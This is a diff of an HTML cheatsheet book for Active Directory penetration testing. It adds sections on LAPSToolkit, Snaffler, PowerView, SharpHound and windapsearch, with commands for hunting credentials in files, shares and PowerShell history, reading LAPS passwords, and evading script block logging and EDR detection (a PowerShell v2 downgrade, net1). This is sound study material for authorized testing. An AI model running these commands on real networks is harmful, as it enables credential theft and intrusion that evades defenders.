@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-a085d3cf.js";
+            window.path_to_searchindex_js = "searchindex-bd2df0d9.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-4a6e0194.js"></script>
+        <script src="toc-16d4fbb8.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -202,6 +202,7 @@
 <li><a href="#impacket-cheatsheet">impacket</a></li>
 <li><a href="#john-the-ripper-cheatsheet">john</a></li>
 <li><a href="#kerbrute-cheatsheet">kerbrute</a></li>
+<li><a href="#lapstoolkit-cheatsheet">lapstoolkit</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#lazagne-cheatsheet">lazagne</a></li>
 <li><a href="#ldapsearch-cheatsheet">ldapsearch</a></li>
@@ -228,6 +229,7 @@
 <li><a href="#rpcclient-cheatsheet">rpcclient</a></li>
 <li><a href="#rubeus-cheatsheet">rubeus</a></li>
 <li><a href="#server-side-template-injection">server-side template injection</a></li>
+<li><a href="#snaffler-cheatsheet">snaffler</a></li>
 <li><a href="#smbclient-cheatsheet">smbclient</a></li>
 <li><a href="#smbmap-cheatsheet">smbmap</a></li>
 <li><a href="#ssh-cheatsheet">ssh</a></li>
@@ -242,6 +244,28 @@
 <h1 id="commandstools-that-do-not-fit-elsewhere"><a class="header" href="#commandstools-that-do-not-fit-elsewhere">Commands/Tools that do not fit elsewhere</a></h1>
 <h2 id="search-a-directory-for-ssh-private-keys"><a class="header" href="#search-a-directory-for-ssh-private-keys">search a directory for ssh private keys</a></h2>
 <pre><code class="language-bash">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
+</code></pre>
+<h2 id="windows-living-off-the-land---quick-reference"><a class="header" href="#windows-living-off-the-land---quick-reference">Windows Living Off the Land - Quick Reference</a></h2>
+<h3 id="check-powershell-command-history-for-credentials"><a class="header" href="#check-powershell-command-history-for-credentials">Check PowerShell command history for credentials</a></h3>
+<pre><code class="language-powershell">Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+</code></pre>
+<h3 id="downgrade-powershell-to-evade-script-block-logging"><a class="header" href="#downgrade-powershell-to-evade-script-block-logging">Downgrade PowerShell to evade Script Block Logging</a></h3>
+<pre><code class="language-powershell">powershell.exe -version 2
+</code></pre>
+<h3 id="check-for-other-logged-in-users"><a class="header" href="#check-for-other-logged-in-users">Check for other logged-in users</a></h3>
+<pre><code class="language-powershell">qwinsta
+</code></pre>
+<h3 id="check-windows-defender-status-cmd"><a class="header" href="#check-windows-defender-status-cmd">Check Windows Defender status (CMD)</a></h3>
+<pre><code class="language-cmd">sc query windefend
+</code></pre>
+<h3 id="domain-and-trust-enumeration-via-wmi"><a class="header" href="#domain-and-trust-enumeration-via-wmi">Domain and trust enumeration via WMI</a></h3>
+<pre><code class="language-powershell">wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+</code></pre>
+<h3 id="dsquery---find-users-with-passwd_notreqd"><a class="header" href="#dsquery---find-users-with-passwd_notreqd">Dsquery - find users with PASSWD_NOTREQD</a></h3>
+<pre><code class="language-powershell">dsquery * -filter "(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+</code></pre>
+<h3 id="dsquery---find-domain-controllers"><a class="header" href="#dsquery---find-domain-controllers">Dsquery - find Domain Controllers</a></h3>
+<pre><code class="language-powershell">dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
@@ -295,7 +319,7 @@ sudo neo4j console
 <h2 id="data-collection"><a class="header" href="#data-collection">Data Collection</a></h2>
 <h3 id="sharphound-windows"><a class="header" href="#sharphound-windows">SharpHound (Windows)</a></h3>
 <h4 id="all-collection-methods"><a class="header" href="#all-collection-methods">All Collection Methods</a></h4>
-<pre><code class="language-powershell">.\SharpHound.exe -c All
+<pre><code class="language-powershell">.\SharpHound.exe -c All --zipfilename output
 </code></pre>
 <h4 id="specific-collection-methods"><a class="header" href="#specific-collection-methods">Specific Collection Methods</a></h4>
 <pre><code class="language-powershell">.\SharpHound.exe -c DCOnly
@@ -325,6 +349,25 @@ sudo neo4j console
 <tr><td><code>ACL</code></td><td>ACL data</td></tr>
 <tr><td><code>ObjectProps</code></td><td>Object properties</td></tr>
 <tr><td><code>Container</code></td><td>OU/GPO container structure</td></tr>
+<tr><td><code>RDP</code></td><td>Remote Desktop access</td></tr>
+<tr><td><code>DCOM</code></td><td>DCOM access</td></tr>
+<tr><td><code>PSRemote</code></td><td>PowerShell Remoting access</td></tr>
+<tr><td><code>SPNTargets</code></td><td>SPN targets</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="additional-sharphound-flags"><a class="header" href="#additional-sharphound-flags">Additional SharpHound Flags</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--zipfilename NAME</code></td><td>Custom output zip file name</td></tr>
+<tr><td><code>-s</code> / <code>--searchforest</code></td><td>Search all domains in the forest</td></tr>
+<tr><td><code>--stealth</code></td><td>Stealth collection (prefer DCOnly)</td></tr>
+<tr><td><code>-f FILTER</code></td><td>Add LDAP filter to pregenerated filter</td></tr>
+<tr><td><code>--computerfile FILE</code></td><td>File with specific computer targets</td></tr>
 </tbody>
 </table>
 </div>
@@ -624,6 +667,11 @@ proxychains nmap -sT &lt;TARGET_IP&gt;
 <li><code>enum_av</code> - Enumerate AV products</li>
 <li><code>gpp_password</code> - Find GPP passwords</li>
 </ul>
+<h3 id="spider_plus-module"><a class="header" href="#spider_plus-module">spider_plus Module</a></h3>
+<p>Spider a specific share and output all readable files as JSON:</p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.10 -u admin -p Password123 -M spider_plus --share 'Department Shares'
+</code></pre>
+<p>Output written to <code>/tmp/cme_spider_plus/&lt;ip&gt;.json</code>. Look for <code>web.config</code>, scripts, and files with hardcoded credentials.</p>
 <hr>
 <h2 id="database"><a class="header" href="#database">Database</a></h2>
 <p>CME stores results in a database:</p>
@@ -1881,13 +1929,27 @@ hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
 </code></pre>
 <hr>
 <h2 id="impacket-wmiexec"><a class="header" href="#impacket-wmiexec">impacket-wmiexec</a></h2>
-<p>Execute commands via WMI.</p>
+<p>Execute commands via WMI. More stealthy than psexec — no files dropped on disk, fewer logs. Runs as the authenticated user (not SYSTEM). Each command spawns a new <code>cmd.exe</code> via WMI (generates Event ID 4688).</p>
 <h3 id="interactive-shell-2"><a class="header" href="#interactive-shell-2">Interactive Shell</a></h3>
 <pre><code class="language-bash">impacket-wmiexec administrator:'Password123'@10.10.10.10
 </code></pre>
 <h3 id="execute-command-2"><a class="header" href="#execute-command-2">Execute Command</a></h3>
 <pre><code class="language-bash">impacket-wmiexec administrator:'Password123'@10.10.10.10 'whoami'
 </code></pre>
+<h3 id="psexec-vs-wmiexec"><a class="header" href="#psexec-vs-wmiexec">psexec vs wmiexec</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th></th><th>psexec</th><th>wmiexec</th></tr>
+</thead>
+<tbody>
+<tr><td>Runs as</td><td>SYSTEM</td><td>Authenticated user</td></tr>
+<tr><td>Files on disk</td><td>Yes (ADMIN$)</td><td>No</td></tr>
+<tr><td>Log volume</td><td>Higher</td><td>Lower</td></tr>
+<tr><td>Stealth</td><td>Lower</td><td>Higher</td></tr>
+</tbody>
+</table>
+</div>
 <hr>
 <h2 id="impacket-dcomexec"><a class="header" href="#impacket-dcomexec">impacket-dcomexec</a></h2>
 <p>Execute commands via DCOM.</p>
@@ -2273,6 +2335,45 @@ sudo umount /media/bitlocker
 </tbody>
 </table>
 </div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="lapstoolkit-cheatsheet"><a class="header" href="#lapstoolkit-cheatsheet">LAPSToolkit Cheatsheet</a></h1>
+<p>PowerShell tool for enumerating and abusing Microsoft LAPS (Local Administrator Password Solution) in Active Directory environments.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a></li>
+</ul>
+<hr>
+<h2 id="loading-lapstoolkit"><a class="header" href="#loading-lapstoolkit">Loading LAPSToolkit</a></h2>
+<pre><code class="language-powershell">Import-Module .\LAPSToolkit.ps1
+</code></pre>
+<hr>
+<h2 id="find-delegated-groups"><a class="header" href="#find-delegated-groups">Find Delegated Groups</a></h2>
+<p>Parse <code>ExtendedRights</code> for all computers with LAPS enabled. Shows groups specifically delegated to read LAPS passwords:</p>
+<pre><code class="language-powershell">Find-LAPSDelegatedGroups
+</code></pre>
+<hr>
+<h2 id="find-extended-rights"><a class="header" href="#find-extended-rights">Find Extended Rights</a></h2>
+<p>Check rights on each LAPS-enabled computer for groups with read access and users with “All Extended Rights.” Users with this right can read LAPS passwords and may be less protected than users in delegated groups:</p>
+<pre><code class="language-powershell">Find-AdmPwdExtendedRights
+</code></pre>
+<hr>
+<h2 id="get-laps-computers-and-passwords"><a class="header" href="#get-laps-computers-and-passwords">Get LAPS Computers and Passwords</a></h2>
+<p>Search for LAPS-enabled computers, password expiration, and cleartext passwords (if your user has read access):</p>
+<pre><code class="language-powershell">Get-LAPSComputers
+</code></pre>
+<hr>
+<h2 id="enumeration-flow"><a class="header" href="#enumeration-flow">Enumeration Flow</a></h2>
+<ol>
+<li><code>Find-LAPSDelegatedGroups</code> — identify which groups can read LAPS passwords per OU</li>
+<li><code>Find-AdmPwdExtendedRights</code> — find users/groups with extended rights on LAPS-enabled computers</li>
+<li><code>Get-LAPSComputers</code> — attempt to read actual passwords and expiration dates</li>
+</ol>
+<hr>
+<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
+<ul>
+<li>An account that has joined a computer to the domain receives <strong>All Extended Rights</strong> over that host, which includes the ability to read LAPS passwords</li>
+<li>Machines without LAPS installed are potential lateral movement targets (local admin password reuse)</li>
+<li>LAPS passwords are stored in the <code>ms-Mcs-AdmPwd</code> attribute on computer objects in AD</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="latency-numbers-every-sre-should-know"><a class="header" href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></h1>
 <p>nanosecond = 1/1,000,000,000 second
@@ -4122,13 +4223,39 @@ net stop &lt;service&gt;
 <pre><code class="language-cmd">net time \\dc01 /set
 </code></pre>
 <hr>
+<h2 id="domain-computer-and-dc-enumeration"><a class="header" href="#domain-computer-and-dc-enumeration">Domain Computer and DC Enumeration</a></h2>
+<h3 id="list-domain-computers"><a class="header" href="#list-domain-computers">List Domain Computers</a></h3>
+<pre><code class="language-cmd">net group "domain computers" /domain
+</code></pre>
+<h3 id="list-domain-controllers"><a class="header" href="#list-domain-controllers">List Domain Controllers</a></h3>
+<pre><code class="language-cmd">net group "Domain Controllers" /domain
+</code></pre>
+<h3 id="list-domain-admin-members"><a class="header" href="#list-domain-admin-members">List Domain Admin Members</a></h3>
+<pre><code class="language-cmd">net group "Domain Admins" /domain
+</code></pre>
+<h3 id="view-domain-shares"><a class="header" href="#view-domain-shares">View Domain Shares</a></h3>
+<pre><code class="language-cmd">net view /all /domain
+</code></pre>
+<h3 id="view-all-shares-on-a-host"><a class="header" href="#view-all-shares-on-a-host">View All Shares on a Host</a></h3>
+<pre><code class="language-cmd">net view \\computer /ALL
+</code></pre>
+<hr>
+<h2 id="evasion"><a class="header" href="#evasion">Evasion</a></h2>
+<h3 id="use-net1-to-avoid-detection"><a class="header" href="#use-net1-to-avoid-detection">Use net1 to Avoid Detection</a></h3>
+<p><code>net1</code> executes the same functions as <code>net</code> but may bypass string-based EDR detection rules:</p>
+<pre><code class="language-cmd">net1 user /domain
+net1 group /domain
+net1 accounts /domain
+</code></pre>
+<hr>
 <h2 id="tips-3"><a class="header" href="#tips-3">Tips</a></h2>
 <ul>
 <li>Always available on Windows — no need to transfer tools</li>
 <li><code>/domain</code> flag targets the domain instead of the local machine</li>
 <li><code>net accounts</code> is the quickest way to check password policy when on a Windows host</li>
 <li>Combine with <code>net view</code> and <code>net use</code> for lateral movement</li>
-<li>Output can be noisy in logs — consider alternatives like PowerView for stealth</li>
+<li><code>net.exe</code> commands are commonly monitored by EDR — use <code>net1</code> as an alternative</li>
+<li>Consider <code>dsquery</code> for LDAP-based queries when <code>net</code> is being monitored</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="netcat-file-transfer"><a class="header" href="#netcat-file-transfer">Netcat File Transfer</a></h1>
@@ -4544,11 +4671,16 @@ Get-DomainComputer | select dnshostname, operatingsystem
 <h3 id="find-computers-where-current-user-has-local-admin"><a class="header" href="#find-computers-where-current-user-has-local-admin">Find Computers Where Current User Has Local Admin</a></h3>
 <pre><code class="language-powershell">Find-LocalAdminAccess
 </code></pre>
+<h3 id="test-local-admin-access-on-specific-host"><a class="header" href="#test-local-admin-access-on-specific-host">Test Local Admin Access on Specific Host</a></h3>
+<pre><code class="language-powershell">Test-AdminAccess -ComputerName dc01
+</code></pre>
 <hr>
-<h2 id="share-enumeration"><a class="header" href="#share-enumeration">Share Enumeration</a></h2>
+<h2 id="share--file-server-enumeration"><a class="header" href="#share--file-server-enumeration">Share / File Server Enumeration</a></h2>
 <pre><code class="language-powershell">Find-DomainShare
 Find-DomainShare -CheckShareAccess
 Find-InterestingDomainShareFile
+Get-DomainFileServer
+Get-DomainDFSShare
 </code></pre>
 <hr>
 <h2 id="acl-enumeration"><a class="header" href="#acl-enumeration">ACL Enumeration</a></h2>
@@ -4578,6 +4710,11 @@ Find-InterestingDomainShareFile
 Get-DomainTrust -Domain other.local
 Get-ForestDomain
 Get-ForestTrust
+Get-DomainTrustMapping
+</code></pre>
+<h3 id="foreign-users-and-groups"><a class="header" href="#foreign-users-and-groups">Foreign Users and Groups</a></h3>
+<pre><code class="language-powershell">Get-DomainForeignUser
+Get-DomainForeignGroupMember
 </code></pre>
 <hr>
 <h2 id="gpo-enumeration"><a class="header" href="#gpo-enumeration">GPO Enumeration</a></h2>
@@ -4609,12 +4746,39 @@ $cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pas
 Get-DomainUser -Credential $cred
 </code></pre>
 <hr>
+<h2 id="security-control-enumeration"><a class="header" href="#security-control-enumeration">Security Control Enumeration</a></h2>
+<p>These are built-in PowerShell cmdlets (not PowerView) commonly used alongside AD enumeration to assess host defenses.</p>
+<h3 id="windows-defender-status"><a class="header" href="#windows-defender-status">Windows Defender Status</a></h3>
+<pre><code class="language-powershell">Get-MpComputerStatus
+</code></pre>
+<p>Key fields: <code>RealTimeProtectionEnabled</code>, <code>AntivirusEnabled</code>, <code>BehaviorMonitorEnabled</code></p>
+<h3 id="applocker-policy"><a class="header" href="#applocker-policy">AppLocker Policy</a></h3>
+<pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+</code></pre>
+<h3 id="powershell-language-mode"><a class="header" href="#powershell-language-mode">PowerShell Language Mode</a></h3>
+<pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p><code>ConstrainedLanguage</code> = restricted; <code>FullLanguage</code> = unrestricted.</p>
+<hr>
+<h2 id="utility-functions"><a class="header" href="#utility-functions">Utility Functions</a></h2>
+<h3 id="export-results-to-csv"><a class="header" href="#export-results-to-csv">Export Results to CSV</a></h3>
+<pre><code class="language-powershell">Get-DomainUser | Export-PowerViewCSV -Path users.csv
+</code></pre>
+<h3 id="convert-name-to-sid"><a class="header" href="#convert-name-to-sid">Convert Name to SID</a></h3>
+<pre><code class="language-powershell">ConvertTo-SID -ObjectName "Domain Admins"
+</code></pre>
+<h3 id="request-kerberos-ticket-for-spn"><a class="header" href="#request-kerberos-ticket-for-spn">Request Kerberos Ticket for SPN</a></h3>
+<pre><code class="language-powershell">Get-DomainSPNTicket -SPN "MSSQLSvc/sql01.domain.local:1433"
+</code></pre>
+<hr>
 <h2 id="tips-4"><a class="header" href="#tips-4">Tips</a></h2>
 <ul>
 <li>Pair with BloodHound for visual attack path analysis</li>
 <li><code>Find-LocalAdminAccess</code> can be noisy — scans all domain computers</li>
 <li>Use <code>-Properties</code> to limit returned attributes for faster queries</li>
 <li>SharpView is a .NET port for environments where PowerShell is restricted</li>
+<li>BC-Security maintains an updated fork with additions like <code>Get-NetGmsa</code> (Group Managed Service Accounts)</li>
+<li><code>Get-DomainGroupMember -Recurse</code> reveals nested group membership (critical for finding hidden privilege escalation)</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="ptunnel-ng"><a class="header" href="#ptunnel-ng">ptunnel-ng</a></h1>
@@ -4660,7 +4824,7 @@ proxychains nmap -sV -sT &lt;TARGET_IP&gt; -p3389
 </tbody>
 </table>
 </div>
-<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
+<h2 id="notes-4"><a class="header" href="#notes-4">Notes</a></h2>
 <ul>
 <li>Requires root/sudo (raw ICMP sockets)</li>
 <li>Only works when ICMP echo is permitted through the firewall</li>
@@ -5337,6 +5501,13 @@ rpcclient -U 'admin%Password123' 10.10.10.10 -c 'setuserinfo2 newuser 23 NewPass
 <pre><code class="language-bash">rpcclient -U 'admin%Password123' 10.10.10.10 -c 'chgpasswd username oldpass newpass'
 </code></pre>
 <hr>
+<h2 id="understanding-sids-and-rids"><a class="header" href="#understanding-sids-and-rids">Understanding SIDs and RIDs</a></h2>
+<ul>
+<li><strong>SID</strong> (Security Identifier): unique to a domain (e.g. <code>S-1-5-21-3842939050-3880317879-2865463114</code>)</li>
+<li><strong>RID</strong> (Relative Identifier): appended to SID to uniquely identify an object</li>
+<li>Full user SID = domain SID + RID (e.g. <code>S-1-5-21-...-1111</code>)</li>
+<li>Built-in account RIDs are consistent across all domains (Administrator is always 500/0x1f4)</li>
+</ul>
 <h2 id="common-rids"><a class="header" href="#common-rids">Common RIDs</a></h2>
 <div class="table-wrapper">
 <table>
@@ -5559,6 +5730,91 @@ Rubeus.exe asktgt /user:john /domain:domain.local /rc4:&lt;hash&gt; /ptt
 <pre><code class="language-powershell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;base64_string&gt;"))
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="snaffler-cheatsheet"><a class="header" href="#snaffler-cheatsheet">Snaffler Cheatsheet</a></h1>
+<p>Tool for hunting credentials and sensitive data across SMB shares in Active Directory environments. Enumerates domain hosts, discovers readable shares, and searches for files of interest.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/SnaffCon/Snaffler">https://github.com/SnaffCon/Snaffler</a></li>
+</ul>
+<hr>
+<h2 id="requirements-1"><a class="header" href="#requirements-1">Requirements</a></h2>
+<ul>
+<li>Must be run from a <strong>domain-joined host</strong> or in a <strong>domain-user context</strong></li>
+<li>.NET executable (Windows only)</li>
+</ul>
+<hr>
+<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
+<pre><code class="language-powershell">.\Snaffler.exe -s -d domain.local -o snaffler.log -v data
+</code></pre>
+<hr>
+<h2 id="flags-1"><a class="header" href="#flags-1">Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-s</code></td><td>Print results to console</td></tr>
+<tr><td><code>-d</code></td><td>Domain to search</td></tr>
+<tr><td><code>-o</code></td><td>Output log file path</td></tr>
+<tr><td><code>-v</code></td><td>Verbosity level</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="verbosity-levels"><a class="header" href="#verbosity-levels">Verbosity Levels</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Level</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>data</code></td><td>Results only (recommended — easiest to review)</td></tr>
+<tr><td><code>info</code></td><td>Results + informational messages</td></tr>
+<tr><td><code>debug</code></td><td>Verbose debug output</td></tr>
+<tr><td><code>trace</code></td><td>Maximum verbosity</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="output-color-coding"><a class="header" href="#output-color-coding">Output Color Coding</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Color</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Red</strong></td><td>High interest — keys, database dumps, credentials</td></tr>
+<tr><td><strong>Green</strong></td><td>Shares discovered</td></tr>
+<tr><td><strong>Black</strong></td><td>Notable files — password databases, VPN configs</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="file-types-snaffler-looks-for"><a class="header" href="#file-types-snaffler-looks-for">File Types Snaffler Looks For</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Category</th><th>Extensions</th></tr>
+</thead>
+<tbody>
+<tr><td>Credential stores</td><td><code>.kdb</code>, <code>.kwallet</code>, <code>.psafe3</code></td></tr>
+<tr><td>Keys</td><td><code>.key</code>, <code>.keypair</code>, <code>.ppk</code>, <code>.keychain</code></td></tr>
+<tr><td>Database dumps</td><td><code>.sqldump</code>, <code>.mdf</code></td></tr>
+<tr><td>VPN / Network configs</td><td><code>.tblk</code></td></tr>
+<tr><td>Config files</td><td><code>web.config</code>, <code>.conf</code>, <code>.ini</code></td></tr>
+<tr><td>Scripts with passwords</td><td><code>.ps1</code>, <code>.bat</code>, <code>.cmd</code>, <code>.vbs</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="tips-5"><a class="header" href="#tips-5">Tips</a></h2>
+<ul>
+<li>Output can be very large in big environments — always use <code>-o</code> to write to a log file</li>
+<li>Use <code>-v data</code> to keep console output manageable</li>
+<li>Let Snaffler run in the background and review results later</li>
+<li>Provide raw Snaffler output to clients as supplemental data to help them prioritize share lockdown</li>
+<li>Pair with CrackMapExec <code>spider_plus</code> for complementary share enumeration</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="smbclient-cheatsheet"><a class="header" href="#smbclient-cheatsheet">smbclient Cheatsheet</a></h1>
 <p>SMB/CIFS client for accessing Windows shares from Linux.</p>
 <hr>
@@ -5751,6 +6007,9 @@ domain = MYDOMAIN
 </code></pre>
 <h3 id="recursive-listing-with-depth"><a class="header" href="#recursive-listing-with-depth">Recursive Listing with Depth</a></h3>
 <pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123 -R --depth 3
+</code></pre>
+<h3 id="recursive-listing-directories-only"><a class="header" href="#recursive-listing-directories-only">Recursive Listing (Directories Only)</a></h3>
+<pre><code class="language-bash">smbmap -u admin -p Password123 -d MYDOMAIN -H 10.10.10.10 -R 'Share Name' --dir-only
 </code></pre>
 <h3 id="download-all-text-files"><a class="header" href="#download-all-text-files">Download All Text Files</a></h3>
 <pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123 -R -A '\.txt$'
@@ -6514,7 +6773,7 @@ SELECT name, sid FROM sys.sql_logins
 <h2 id="description"><a class="header" href="#description">Description</a></h2>
 <p><code>unshadow</code> is a utility included with John the Ripper that combines <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a single file suitable for password cracking. This is the format that John’s single crack mode was designed for.</p>
 <hr>
-<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
+<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -6566,7 +6825,7 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 </table>
 </div>
 <hr>
-<h2 id="tips-5"><a class="header" href="#tips-5">Tips</a></h2>
+<h2 id="tips-6"><a class="header" href="#tips-6">Tips</a></h2>
 <ul>
 <li>John’s <strong>single crack mode</strong> is ideal for unshadowed files as it uses GECOS data (full name, username) to generate candidate passwords</li>
 <li>Always work with copies of system files, not the originals</li>
@@ -6575,7 +6834,7 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="wafw00f-cheatsheet"><a class="header" href="#wafw00f-cheatsheet">wafw00f Cheatsheet</a></h1>
-<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
+<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -6740,6 +6999,10 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 <tr><td><code>--admin-objects</code></td><td>Enumerate objects with admin count &gt; 0</td></tr>
 <tr><td><code>-PU</code></td><td>Enumerate privileged users</td></tr>
 <tr><td><code>--functionality</code></td><td>Enumerate domain functionality level</td></tr>
+<tr><td><code>--user-spns</code></td><td>Find users with SPNs (Kerberoastable)</td></tr>
+<tr><td><code>--unconstrained-users</code></td><td>Users with unconstrained delegation</td></tr>
+<tr><td><code>--unconstrained-computers</code></td><td>Computers with unconstrained delegation</td></tr>
+<tr><td><code>--gpos</code></td><td>Enumerate GPOs</td></tr>
 <tr><td><code>-s SEARCH</code></td><td>Custom LDAP search term</td></tr>
 <tr><td><code>--custom FILTER</code></td><td>Custom LDAP filter</td></tr>
 <tr><td><code>--attrs ATTRS</code></td><td>Attributes to return (comma-separated)</td></tr>
@@ -6775,10 +7038,23 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 <pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 -s "admin"
 </code></pre>
 <hr>
-<h2 id="tips-6"><a class="header" href="#tips-6">Tips</a></h2>
+<h2 id="additional-enumeration"><a class="header" href="#additional-enumeration">Additional Enumeration</a></h2>
+<h3 id="kerberoastable-users"><a class="header" href="#kerberoastable-users">Kerberoastable Users</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 --user-spns
+</code></pre>
+<h3 id="unconstrained-delegation"><a class="header" href="#unconstrained-delegation">Unconstrained Delegation</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 --unconstrained-users
+./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 --unconstrained-computers
+</code></pre>
+<h3 id="gpo-enumeration-1"><a class="header" href="#gpo-enumeration-1">GPO Enumeration</a></h3>
+<pre><code class="language-bash">./windapsearch.py --dc-ip 172.16.5.5 -d domain.local -u user@domain.local -p Password123 --gpos
+</code></pre>
+<hr>
+<h2 id="tips-7"><a class="header" href="#tips-7">Tips</a></h2>
 <ul>
 <li>Blank <code>-u ""</code> triggers anonymous bind (only works if LDAP anonymous bind is enabled)</li>
 <li>Use <code>--full</code> to get all attributes for deeper analysis</li>
+<li><code>-PU</code> performs recursive lookups for nested group membership — reveals users with excess privileges through group nesting (useful for reporting)</li>
 <li>Simpler than raw <code>ldapsearch</code> for common AD enumeration tasks</li>
 <li>Output can be saved with <code>-o</code> for post-processing</li>
 </ul>
@@ -20159,6 +20435,10 @@ find . -exec /bin/sh \; -quit
 <li><a href="#password-spraying-overview">Password Spraying Overview</a></li>
 <li><a href="#enumerating--retrieving-password-policies">Enumerating &amp; Retrieving Password Policies</a></li>
 <li><a href="#password-spraying---making-a-target-user-list">Password Spraying - Making a Target User List</a></li>
+<li><a href="#enumerating-security-controls">Enumerating Security Controls</a></li>
+<li><a href="#credentialed-enumeration---from-linux">Credentialed Enumeration - from Linux</a></li>
+<li><a href="#credentialed-enumeration---from-windows">Credentialed Enumeration - from Windows</a></li>
+<li><a href="#living-off-the-land">Living Off the Land</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="external-recon-and-enumeration-principles"><a class="header" href="#external-recon-and-enumeration-principles">External Recon and Enumeration Principles</a></h1>
@@ -20773,6 +21053,805 @@ rpcclient $&gt; enumdomusers
 </ul>
 <p>This protects you if lockouts occur and helps the client cross-reference against their SIEM logs.</p>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="enumerating-security-controls"><a class="header" href="#enumerating-security-controls">Enumerating Security Controls</a></h1>
+<p>After gaining a foothold in an AD environment, enumerate the defensive state of hosts to understand what security controls are in place. The products in use affect which tools work for AD enumeration, exploitation, and post-exploitation. Understanding protections informs tool selection and helps plan a course of action — either avoiding or modifying certain tools. Protections may vary across machines in the same environment; policies applied to some hosts may not apply to others.</p>
+<h2 id="windows-defender"><a class="header" href="#windows-defender">Windows Defender</a></h2>
+<p>Windows Defender (Microsoft Defender after Windows 10 May 2020 Update) blocks many common offensive tools (e.g. PowerView) by default. Check its status with the built-in <code>Get-MpComputerStatus</code> cmdlet.</p>
+<h3 id="checking-defender-status"><a class="header" href="#checking-defender-status">Checking Defender Status</a></h3>
+<pre><code class="language-powershell">Get-MpComputerStatus
+</code></pre>
+<p>Key fields to check:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td><code>RealTimeProtectionEnabled</code></td><td>Real-time scanning is active</td></tr>
